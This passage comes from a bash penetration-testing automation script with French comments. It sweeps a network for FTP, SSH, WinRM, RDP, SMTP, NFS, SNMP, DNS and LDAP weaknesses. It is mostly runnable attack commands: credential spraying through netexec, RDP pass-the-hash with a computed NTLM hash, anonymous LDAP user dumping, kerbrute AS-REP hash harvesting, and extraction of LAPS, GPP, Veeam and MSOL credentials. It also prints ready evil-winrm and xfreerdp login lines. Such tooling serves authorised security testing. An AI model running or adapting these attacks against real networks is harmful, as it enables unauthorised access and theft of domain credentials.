				if [[ "${module}" == "ms17-010" || "${module}" == "zerologon" || "${module}" == "petitpotam" || "${module}" == "nopac" ]] && ! grep -Eqio "Unable to detect|does NOT appear vulnerable" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt && grep -Eqio "vulnerable" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					# MS17-10 / ZEROLOGON / PETITPOTAM
					green_log "${SPACE}${SPACE}[💀] Vulnerabilty '${module}' found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif [[ "${module}" == "gpp_password" || "${module}" == "gpp_password" ]] && grep -Eqio "Found credentials" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					# GPP_PASSWORD
					green_log "${SPACE}${SPACE}[💀] Vulnerabilty '${module}' found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif [[ "${module}" == "webdav" || "${module}" == "spooler" ]] && grep -Eqio "${module}" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					# WEBDAV / SPOOLER
					green_log "${SPACE}${SPACE}[💀] ${module} found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif [[ "${module}" == "install_elevated" ]] && grep -Eqio "Enabled" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					# INSTALL_ELEVATED
					green_log "${SPACE}${SPACE}[💀] install_elevated vulnérability found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif [[ "${module}" == "enum_av" ]] && grep -Eqio "enum_av" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt && ! grep -Eqio "Found NOTHING" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					# ENUM_AV
					green_log "${SPACE}${SPACE}[💀] AV identified on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif [[ "${module}" == "enumdns" ]] && grep -Eqio "record" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					# ENUMDNS
					green_log "${SPACE}${SPACE}[💀] DNS exfiltration done on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif echo "${module}" | grep -q "coerce_plus" &&  grep -Eqio "vulnerable" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt ;then
					# COERCE_PLUS
					coerce_vulns=$(cat ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt | grep -i "COERCE_PLUS" | awk -F ", " '{print $2}')
					for coerce_vulns_key in $coerce_vulns; do
						green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$coerce_vulns_key' found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
						echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_$coerce_vulns_key.txt"
					done
				elif echo "${module}" | grep -q "veeam" &&  grep -Eqio "Extracting stored credentials" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt ;then
					green_log "${SPACE}${SPACE}[💀] At least 1 vulnerabilty found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				elif echo "${module}" | grep -q "msol" &&  grep -Eqio "Username:" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt && ! grep -Eqio "Could not retrieve output file" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					green_log "${SPACE}${SPACE}[💀] MSOL credentials could be find on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt"
					echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
				fi
			fi
		done
	done
	sort -u "${DIR_VULNS}/Vulns_Devices_${module}.txt" -o "${DIR_VULNS}/Vulns_Devices_${module}.txt"
}

###################### FTP  ##########################
ftp () {
	if [ -e "${DIR_PORTS}/21.txt" ]; then
		# Lire le fichier 21.txt ligne par ligne
		log "[🔍] Checking FTP"
		
		FTP=$(cat ${DIR_PORTS}/21.txt)
		for ip in $FTP; do
			if control_ip_attack; then
				hostname=$(grep -aE "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				log "${SPACE}[📂] Checking ${ip} (${hostname}) ..."
				# Essayer de se connecter à l'adresse IP via FTP
				${proxychains} netexec ftp ${ip} -u "anonymous" -p "" < /dev/null >> ${DIR_VULNS}/ftp_anonymous_${ip}.txt 2>/dev/null 
			
				# Vérifier le code de retour de la commande SSH
				if grep -aq '\[+\]' ${DIR_VULNS}/ftp_anonymous_${ip}.txt; then
					green_log "${SPACE}${SPACE}[💀] FTP ANONYMOUS connection successed"
					blue_log "${SPACE}${SPACE} [+] ${proxychains} ftp anonymous@${ip}"
					echo "${ip}" >> ${DIR_VULNS}/machines_ftp_anonymous.txt
					sort -u ${DIR_VULNS}/machines_ftp_anonymous.txt -o ${DIR_VULNS}/machines_ftp_anonymous.txt
				fi
				
				if [[ "${Username}" != "anonymous" ]];then
					${proxychains} netexec ftp ${ip} -u ${Username} -p ${Password} < /dev/null >> ${DIR_VULNS}/ftp_${Username}_${ip}.txt 2>/dev/null 
					# Vérifier le code de retour de la commande SSH
					if grep -aq '\[+\]' ${DIR_VULNS}/ftp_${Username}_${ip}.txt; then
						green_log "${SPACE}${SPACE}[💀] FTP connection successed with ${Username} user"
						blue_log "${SPACE}${SPACE} [+] ${proxychains} ftp ${Username}@${ip}"
					fi
				fi
			fi
		done
	fi	

}

###################### SSH  ##########################
ssh () {
	if [ -e "${DIR_PORTS}/22.txt" ] && [ -n "${Username}" ] && [ "${Username}" != "anonymous" ] && [ -n "${Password}" ]; then
		# Lire le fichier 22.txt ligne par ligne
		log "[🔍] Checking SSH"
		SSH=$(cat ${DIR_PORTS}/22.txt)
		for ip in $SSH; do
			if control_ip_attack; then
				hostname=$(grep -aE "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				log "${SPACE}[📂] Checking ${ip} (${hostname}) ..."
				# Essayer de se connecter à l'adresse IP via SSH
				#${proxychains} sshpass -p "${Password}" ssh -o StrictHostKeyChecking=no ${Username}@${ip} "ls" 2>/dev/null
				
				${proxychains} netexec ssh ${ip} -u ${Username} -p ${Password} < /dev/null >> ${DIR_VULNS}/ssh_${Username}_${ip}.txt 2>/dev/null 
				# Vérifier le code de retour de la commande SSH
				if grep -aq '\[+\]' ${DIR_VULNS}/ssh_${Username}_${ip}.txt; then
					green_log "${SPACE}${SPACE}[💀] SSH connection successed"
					blue_log "${SPACE}${SPACE} ${proxychains} ssh ${Username}@${ip}"
				fi
			fi
		done
	fi
}

######## WINRM #######
winrm () {
	# Vérifie si les fichier winrm existe
	if { [ -e "${DIR_PORTS}/5985.txt" ] || [ -e "${DIR_PORTS}/5986.txt" ] || [ -e "${DIR_PORTS}/47001.txt" ]; } && [ "${Username}" != "anonymous" ]; then
		log "[🔍] Checking WINRM"
		for file in ${DIR_PORTS}/5985.txt ${DIR_PORTS}/5986.txt ${DIR_PORTS}/47001.txt; do
			cat "${file}" 2>/dev/null >> "${DIR_PORTS}/winrm.txt"
		done
		sort -u ${DIR_PORTS}/winrm.txt -o ${DIR_PORTS}/winrm.txt
		WINRM=$(cat ${DIR_PORTS}/winrm.txt)
		for ip in $WINRM; do
			if control_ip_attack; then
				hostname=$(grep -aE "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				log "${SPACE}[📂] Checking ${ip} (${hostname}) ..."
				# Essayer de se connecter à l'adresse IP via WINRM
				${proxychains} netexec --timeout ${CME_TIMEOUT} winrm ${ip} -u "${Username}" ${cme_creds} < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/winrm_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/winrm_${ip}"; then
					#Si NTLM n'est pas supporté, recommencer en passant avec kerberos
					kerberos="--kerberos"
					host="${hostname}"
					rm ${DIR_VULNS}/winrm_${ip}
					${proxychains} netexec --timeout ${CME_TIMEOUT} winrm $host -u "${Username}" ${cme_creds} ${kerberos} < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
				fi
				
				# Vérifier le code de retour de la commande WINRM
				if [ "$(cat ${DIR_VULNS}/winrm_${ip} | grep -ai '\[+\]')" ]; then
					green_log "${SPACE}${SPACE}[💀] WINRM connection successed"
					if grep -aq '(Pwn3d!)' ${DIR_VULNS}/winrm_${ip}; then
						red_log "${SPACE}${SPACE}[💀] ${Username} potentially have admin rights !"
					fi
					blue_log "${SPACE}${SPACE} [+] ${proxychains} evil-winrm -i ${ip} -u "${Username}" ${cme_creds}"
				else
					#echo ${DIR_VULNS}/winrm_${ip}
					#cat ${DIR_VULNS}/winrm_${ip}
					rm ${DIR_VULNS}/winrm_${ip}
				fi
			fi
		done
	fi
}

rdp () {	
	######## RDP #######
	# Vérifie si le file 22.txt existe
	if [[ -e "${DIR_PORTS}/3389.txt" ]] && [[ "${Username}" != "anonymous" ]]; then
		#### Avoid error variable $DISPLAY from xfreerdp
		#apt install xvfb
		#Xvfb :99 & export DISPLAY=:99
		
		# Lire le file 22.txt ligne par ligne
		log "[🔍] Checking RDP"
		RDP=$(cat ${DIR_PORTS}/3389.txt)
		for ip in $RDP; do
			if control_ip_attack; then
				hostname=$(grep -aE "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				rdp_mode="NTLM"
				log "${SPACE}[📂] Checking ${ip} (${hostname}) ..."
				if [[ "${Username}" != "anonymous" ]]; then
					${proxychains} netexec --timeout ${CME_TIMEOUT} rdp ${ip} -u ${Username} ${cme_creds} --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
					successed_rdp="${SPACE}${SPACE}[💀] RDP connection successed (via NTLM) -> Can be only available in restricted admin mode or with password"
					if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/rdp_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/rdp_${ip}"; then
						#If NTLM is not supported, restart with kerberos
						rdp_mode="KRB"
						if [[ -n "${hostname}" ]];then
							kerberos="-d $(echo "${hostname}" | cut -d '.' -f 2-) --kerberos"
							host="${hostname}"
						fi
						if [[ -n "${Password}" ]];then
							NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
							#First try with NTLM_Hash
							${proxychains} timeout ${CME_TIMEOUT} netexec rdp $host -u "${Username}" -H "$NTLM" ${kerberos} --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
							check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
							if [[ "$check_rdp" -gt 0 ]]; then
								successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
							else
								#Second try with Password
								${proxychains} timeout ${CME_TIMEOUT} netexec rdp $host -u "${Username}" ${cme_creds} ${kerberos} --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
								check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
								if [[ "$check_rdp" -gt 0 ]]; then
									#Can be detected by disconnection
									successed_rdp="${SPACE}${SPACE}[💀] KRB NON OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
								fi
							fi
						else
							#Can be detected by disconnection
							${proxychains} timeout ${CME_TIMEOUT} netexec rdp $host -u "${Username}" ${cme_creds} ${kerberos} --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
							check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
							if [[ "$check_rdp" -gt 0 ]]; then
								successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
							fi
						fi
					fi
				fi
					
				if grep -aq '\[+\]' ${DIR_VULNS}/rdp_${ip}; then
					if grep -aq '(Pwn3d!)' ${DIR_VULNS}/rdp_${ip}; then
						red_log "${SPACE}${SPACE}[💀] ${Username} have admin rights !"
						admin="1"
					fi
					check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
					if [[ "$check_rdp" -gt 0 ]]; then
						green_log "$successed_rdp"
						if [ "$rdp_mode" = "NTLM" ]; then
							if [ -n "$NT_Hash" ]; then
								blue_log "${SPACE}${SPACE} [+] ${proxychains} xfreerdp3 /cert:tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard"
							else
								blue_log "${SPACE}${SPACE} [+] ${proxychains} xfreerdp3 /cert:tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard"
							fi
						fi
					fi
				fi
			fi
		done
	fi
}

######## SMTP #######
smtp () {
	# 25
	if [ -e "${DIR_PORTS}/25.txt" ]; then
		log "[🔍] Checking SMTP"
		SMTP=$(cat ${DIR_PORTS}/25.txt)
		for ip in $SMTP; do
			if control_ip_attack; then
				mode=("VRFY" "RCPT" "EXPN")
				for mode_key in $mode; do
					${proxychains} smtp-user-enum -M VRFY -U "/root/pentest_priv/Usernames.txt" -t ${ip} < /dev/null > ${DIR_VULNS}/smtp_${ip}.txt 2>/dev/null
					nb_users_smtp=$(grep "exists" "${DIR_VULNS}/smtp_${ip}.txt" | wc -l 2>/dev/null)
					nb_users_smtp_max=$(wc -l < "/root/pentest_priv/Usernames.txt" 2>/dev/null)
					if [[ "$nb_users_smtp" -ne "$nb_users_smtp_max" ]] && [[ "$nb_users_smtp" -ne 0 ]]; then
						green_log "${SPACE}[💀] $nb_users_smtp users found ${ip} via SMTP (mode $mode_key) -> ${DIR_VULNS}/user_smtp_${ip}.txt"
						grep "exists" ${DIR_VULNS}/smtp_${ip}.txt | awk '{print $2}' > ${DIR_VULNS}/user_smtp_${ip}.txt
						sort -u ${DIR_VULNS}/user_smtp_${ip}.txt -o ${DIR_VULNS}/user_smtp_${ip}.txt
						cat ${DIR_VULNS}/user_smtp_${ip}.txt >> ${ROOT_PATH}/users.txt
						sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
					fi
				done
			fi
		done		
	fi
}

######## NFS #######
nfs () {
	# Vérifie si le file 2049.txt existe
	if [ -e "${DIR_PORTS}/2049.txt" ]; then
		log "[🔍] Checking NFS"
		NFS=$(cat ${DIR_PORTS}/2049.txt)
		for ip in $NFS; do
			if control_ip_attack; then	
				${proxychains} showmount -e ${ip} < /dev/null > ${DIR_VULNS}/tmp_nfs.txt 2>/dev/null
				if [ "$(wc -l < ${DIR_VULNS}/tmp_nfs.txt)" -gt 1 ]; then
					green_log "${SPACE}[💀] NFS vulnerability detected on ${ip}"
					blue_log "${SPACE}${SPACE}[+] showmount -e ${ip}"
				fi
			fi
		done
	fi
}

######## VNC #######
vnc () {
	# 5800,5801,5900,5901
	if [[ -e "${DIR_PORTS}/5800.txt" ]] || [[ -e "${DIR_PORTS}/5801.txt" ]] || [[ -e "${DIR_PORTS}/5900.txt" ]] || [[ -e "${DIR_PORTS}/5901.txt" ]]; then
		log "[🔍] Checking NFS"
		for file in ${DIR_PORTS}/5800.txt ${DIR_PORTS}/5801.txt ${DIR_PORTS}/5900.txt ${DIR_PORTS}/5901.txt; do
			cat "${file}" 2>/dev/null >> "${DIR_PORTS}/vnc.txt"
		done
		#assemblage et suppression des doublons des clients
		sort -u ${DIR_PORTS}/vnc.txt -o ${DIR_PORTS}/vnc.txt
		
		green_log "${SPACE}[!] VNC opened on machines (check manually for credentials into default file) -> ${DIR_PORTS}/vnc.txt"
		VNC=$(cat ${DIR_PORTS}/vnc.txt 2>/dev/null)
	fi
}

# < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
###################### DNS ZONE TRANSFER  ##########################
zt () {
	if [[ -s "{${ROOT_PATH}}/hostname_file.txt" && -s "${DIR_PORTS}/53.txt" ]]; then
		log "[🔍] Trying zone transfer"
		DNSPATH=${ROOT_PATH}/ZoneTransfertDNS
		domain=$(head -n 1 ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
		NS=$(${proxychains} host -T -t ns $domain | awk -F"name server" '{print$2}')
		NS_cleaned=$(echo "$NS" | while read -r line; do echo "${line:0: -1}"; done)
		mkdir $DNSPATH 2>/dev/null
		for name_server in $NS_cleaned;
		do
			${proxychains} host -T -t axfr $domain $name_server > $DNSPATH/$name_server.txt 2>/dev/null
			if [[ -s "$DNSPATH/$name_server.txt" && $(grep -qE "; Transfer failed.|timed out" "$DNSPATH/$name_server.txt"; echo $?) -ne 0 ]]; then
				green_log "${SPACE}[💀] Zone transfer performed successfully for $name_server ! -> $DNSPATH/$name_server.txt"
				blue_log "${SPACE} [+] ${proxychains} host -T -t axfr $domain $name_server"
			fi
		done
	fi
}

# ########################### Printer Recon ###############################
printers () {
	log "[🔍] Printer Scan using SNMP Protocol Started"
	
	#pret is a python script that discover printers via snmp broadcast, so we have to determine if a network in on a target
	
	MY_IP=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)
	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
	# Calculer l'adresse réseau pour arp discovery
	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Address:" | awk '{print $2}')
	NETWORK_LAN_BROADCAST=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Broadcast:" | awk '{print $2}')
	
	rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
	for rangeIP_array_key in $rangeIP_array; do
		if echo $rangeIP_array_key | grep -vq "/32"; then
			TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Network:" | awk '{print $2}')
			TARGET_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
		else
			TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Address:" | awk '{print $2}')
			TARGET_LAN_BROADCAST=$TARGET_LAN
		fi

		# Convert IP addresses to integers for comparison
		ip_to_int() {
			local a b c d
			IFS=. read -r a b c d <<< "$1"
			echo $((a * 256**3 + b * 256**2 + c * 256 + d))
		}
		network_start=$(ip_to_int "$NETWORK_LAN")
		network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
		target_start=$(ip_to_int "$TARGET_LAN")
		target_end=$(ip_to_int "$TARGET_LAN_BROADCAST")

		#If attack range is into the selected network interface
		if [[ $network_start -le $target_start && $network_end -ge $target_end ]]; then
			if which pret > /dev/null 2>&1; then
				pret >> ${ROOT_PATH}/PrinterScan.txt 2>>/dev/null
				if grep -qi "Device" ${ROOT_PATH}/PrinterScan.txt ;then
					green_log "${SPACE}[!] Printers found ! Please combine these findings with the nmap web interface scan for printers -> ${ROOT_PATH}/PrinterScan.txt"
				fi
			else
				log "${SPACE}[!] Impossible to find the 'pret' tool."
			fi
		fi
	done
}

# ########################### SNMP ###############################
snmp () {
	if [[ -e "${DIR_PORTS}/161.txt" ]] || [[ -e "${DIR_PORTS}/162.txt" ]] || [[ -e "${DIR_PORTS}/1061.txt" ]] || [[ -e "${DIR_PORTS}/1062.txt" ]]; then
		log "[🔍] Checking SNMP communities"
		if [ -z "${proxychains}" ]; then
			#merge of files
			for file in ${DIR_PORTS}/161.txt ${DIR_PORTS}/162.txt ${DIR_PORTS}/1061.txt ${DIR_PORTS}/1062.txt; do
				cat "${file}" 2>/dev/null >> "${DIR_PORTS}/snmp.txt"
			done
			sort -u "${DIR_PORTS}/snmp.txt" -o "${DIR_PORTS}/snmp.txt"
	  
			onesixtyone -c "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt" -i "${DIR_PORTS}/snmp.txt" -o "${ROOT_PATH}/communities.txt" -w 100 -q
			sort -u "${ROOT_PATH}/communities.txt" -o "${ROOT_PATH}/communities.txt"
			for ip in $(cat ${DIR_PORTS}/snmp.txt); do
				if control_ip_attack; then
					if grep -q "${ip}" "${ROOT_PATH}/communities.txt"; then
						hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
						COMMUNITY=$(grep "${ip}" "${ROOT_PATH}/communities.txt" | awk -F'[][]' '{print $2}')
						for COMMUNITY_KEY in $COMMUNITY; do
							green_log "${SPACE}[💀] SNMP v1 in ${COMMUNITY_KEY} community found on ${ip} (${hostname}) : ${ROOT_PATH}/communities.txt"
						done
					fi

					result_v2c=""
					result_v2c=$(timeout $SNMP_TIMEOUT snmpwalk -v 2c -c public ${ip} )
					if [[ -n "$result_v2c" ]]; then
						green_log "${SPACE}[💀] SNMP v2c in PUBLIC community found on ${ip} (${hostname}) : ${DIR_VULNS}/SNMP-Public_v2c.txt"
						echo "$result_v2c" >> "${DIR_VULNS}/SNMP-Public_v2c.txt"
					fi
				fi
			done
		else
			log "${SPACE}${SPACE} [!]] Unable to perfom SMNP communities check with proxychains (only support TCP packets)"
		fi	
	fi
}

# ########################### LDAP ###############################
ldap () {
	### ANONYMOUS LDAP ###
	if [[ -e "${DIR_PORTS}/389.txt" ]]; then
		mkdir ${DIR_VULNS}/ldap 2>/dev/null
		log "[🔍] Checking anonymous LDAP"
		#Extract the IPs of machines with port 389 open
		ip_389=$(cat "${DIR_PORTS}/389.txt" 2>/dev/null)
		#extraction of the FQDN and IP names of machines with port 389 open
		for ip_389_key in ${ip}_389; do
			grep ${ip}_389_key ${ROOT_PATH}/hostname_file.txt >> ${ROOT_PATH}/IP_FQDN_ldap.txt
		done
		sort -u ${ROOT_PATH}/IP_FQDN_ldap.txt -o ${ROOT_PATH}/IP_FQDN_ldap.txt
		#Extraction of one line (ip + hostname) from the LDAP server (AD) for each domain/sub-domain. The aim is not to carry out the attack on 3 DCs in the same domain
		awk -F ':' '{ split($2, parts, "."); domain = parts[2] "." parts[3] "." parts[4] "." parts[5]  "." parts[6]; if (!seen[domain]++) print $0;}' ${ROOT_PATH}/IP_FQDN_ldap.txt >> ${ROOT_PATH}/IP_FQDN_ldap_filtered.txt
		LDAP_ip=$(cat ${ROOT_PATH}/IP_FQDN_ldap_filtered.txt | cut -d':' -f1)
		LDAP_domain_old=()
		for ip in $LDAP_ip; do
			if control_ip_attack; then
				#Récupération du nom de domaine associé à l'IP
				LDAP_domain=$(grep -E ${ip} ${ROOT_PATH}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2- |cut -d'.' -f2-)				
				#If domain didn't pass yet
				if [[ ! " ${LDAP_domain_old[@]} " =~ " ${LDAP_domain} " ]]; then
					log "${SPACE}[📂] Checking domain ${LDAP_domain} (${ip}) ..."
					#Création de la base pour la requete ldapsearch
					base_ldap="DC=$(echo "$LDAP_domain" | sed 's/\./,DC=/g')"
					DC_Name=$(grep -E ${ip} ${ROOT_PATH}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2-)
					#Adding $LDAP_domain in the LDAP_domain_old LDAP_domain_old
					LDAP_domain_old+=("$LDAP_domain")
					
					#Extraction des utilisateurs et groupes (CN) : Peu précis ..
					${proxychains} ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" | grep 'dn: CN=' > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
					
					if [[ "$check_ldap" -gt 0 ]]; then
						green_log "${SPACE}${SPACE}[💀] Anonymous LDAP possible -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}.txt"
						
						#Aller plus loin en tentant d'extraire les noms d'utilisateurs :
						${proxychains} ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" "objectclass=user" sAMAccountName | grep "sAMAccountName" | awk -F ": " '{print $2}'| grep -v "sAMAccountName" > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
						check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)

						if [[ "$check_ldap" -gt 0 ]]; then
							green_log "${SPACE}${SPACE}[💀] Users extracted -> ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt"
						fi
						
						#Retrieving the users account via kerbrute and trying to get no-preauth users
						${proxychains} kerbrute userenum --dc $DC_Name -d $LDAP_domain ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt -t 50 --downgrade --hash-file ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt > ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt 2>/dev/null
						check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'krb5asrep' | wc -l)
						if [[ "$check_ldap" -gt 0 ]]; then
							green_log "${SPACE}${SPACE}[💀] Users without pre-auth found ! -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt"
						fi
						cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'VALID' | awk -F "[:@]" '{print $4}'| sed 's/^[ \t]*//;s/[ \t]*$//' >> ${ROOT_PATH}/users.txt
						sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
					fi
				fi
			fi	
		done
		
		rm ${ROOT_PATH}/IP_FQDN_ldap.txt
		rm ${ROOT_PATH}/IP_FQDN_ldap_filtered.txt
	fi

	### ENUMERATION LDAP ###
	LDAP_Servers=$(cat ${ROOT_PATH}/ports/88.txt ${ROOT_PATH}/ports/389.txt 2>/dev/null | sort | uniq)
	ldap_modules=(adcs laps get-userPassword get-unixUserPassword)
	if [[ -n "$LDAP_Servers" ]] && [[ "${Username}" != "anonymous" ]]; then
		log "[🔍] Enumeration via LDAP"
		for module in ${ldap_modules[@]};do
			for ip in $LDAP_Servers;do
				if control_ip_attack; then
					host=${ip}
					${proxychains} timeout ${CME_TIMEOUT} netexec ldap $host -u ${Username} ${cme_creds} -M ${module} < /dev/null > ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt 2>/dev/null
					if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt;then 
						#If NTLM isn't supported, then use kerberos authentification
						hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
						if [[ -n "${hostname}" ]];then
							kerberos="-d $(echo "${hostname}" | cut -d '.' -f 2-) --kerberos"
							host="${hostname}"
						else
							kerberos=""
							host="${ip}"
						fi
						${proxychains} timeout ${CME_TIMEOUT} netexec ldap $host -u ${Username} ${cme_creds} ${kerberos} -M ${module} < /dev/null > ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt 2>/dev/null
					fi
					if [[ "${module}" == "laps" ]] && grep -Eqio "Password:" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt;then
						green_log "${SPACE}[💀] '${module}' password(s) found from ${username} account ! -> ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt"
					elif [[ "${module}" == "adcs" ]] && grep -Eqio "FOUND PKI|Found CN" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt;then
						green_log "${SPACE}[💀] '${module}' server found ! -> ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt"
					elif [[ "${module}" == "get-userPassword" ]] && grep -Eqio "GET-USER" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt && ! grep -Eqio "No userPassword Found" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt;then
						green_log "${SPACE}[💀] Users Password found ! -> ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt"
					elif [[ "${module}" == "get-unixUserPassword" ]] && grep -Eqio "GET-UNIX" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt && ! grep -Eqio "No unixUserPassword Found" ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt;then
						green_log "${SPACE}[💀] Unix Users Password found ! -> ${DIR_VULNS}/Enum_Device_${ip}_${module}.txt"
					fi
				fi	
			done 
		done
	fi
}

ipmi () {
	if [[ -e "${DIR_PORTS}/623.txt" ]]; then
		log "[🔍] Some IPMI ports detected ! -> ${DIR_PORTS}/623.txt"
	fi
}

mssql () {
	if [[ -e "${DIR_PORTS}/1433.txt" ]] && [[ "${Username}" != "anonymous" ]]; then
		mkdir ${DIR_VULNS}/mssql 2>/dev/null
		log "[🔍] Checking MSSQL"
		MSSQL=$(cat ${DIR_PORTS}/1433.txt)
		for ip in $MSSQL; do
			if control_ip_attack; then
				log "${SPACE}[📂] Checking ${ip} (${hostname}) ..."
